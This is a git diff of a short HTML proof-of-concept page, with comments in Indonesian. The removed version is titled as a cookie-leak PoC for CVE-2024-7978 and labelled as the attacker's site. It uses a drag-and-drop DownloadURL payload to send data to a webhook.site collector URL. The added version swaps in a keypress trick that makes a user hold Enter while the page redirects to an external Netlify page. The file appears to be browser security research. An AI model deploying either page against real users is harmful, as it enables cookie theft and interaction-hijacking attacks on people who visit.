@@ -2,46 +2,24 @@
 <html>
 
 <head>
-    <title>PoC - CVE-2024-7978 (Cookie Leak)</title>
+    <title>Site A</title>
     <style>
         body {
-            background: #222;
-            color: #fff;
-            font-family: sans-serif;
-            text-align: center;
-            padding: 50px;
-        }
-
-        #dragTarget {
-            width: 300px;
-            height: 100px;
-            background: #e91e63;
-            color: white;
-            line-height: 100px;
-            font-weight: bold;
-            cursor: grab;
-            margin: auto;
+            background-color: #ffebee;
         }
     </style>
 </head>
 
 <body>
-    <h3>Situs A (Attacker)</h3>
-
-    <div id="dragTarget" draggable="true">
-        TARIK GUA KE DESKTOP LU!
-    </div>
-
+    <h3>Situs A (Origin 1)</h3>
+    <button id="targetBtn">Click this button, then PRESS and HOLD "Enter"</button>
     <script>
-        const dragTarget = document.getElementById('dragTarget');
-
-        dragTarget.addEventListener('dragstart', (e) => {
-            console.log("Menyiapkan payload Cross-Origin Download...");
-            const targetURL = "https://webhook.site/b7abc49c-2c82-4702-b740-206808415cbd";
-            const payload = `application/octet-stream:hasil_leak.txt:${targetURL}`;
-
-            e.dataTransfer.setData('DownloadURL', payload);
-            e.dataTransfer.effectAllowed = 'all';
+        document.getElementById('targetBtn').focus();
+        window.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                document.body.innerHTML = "<h3>Navigasi... Hold Enter!</h3>";
+                window.location.href = 'https://kaleidoscopic-druid-cece23.netlify.app/site-b.html';
+            }
         });
     </script>
 </body>
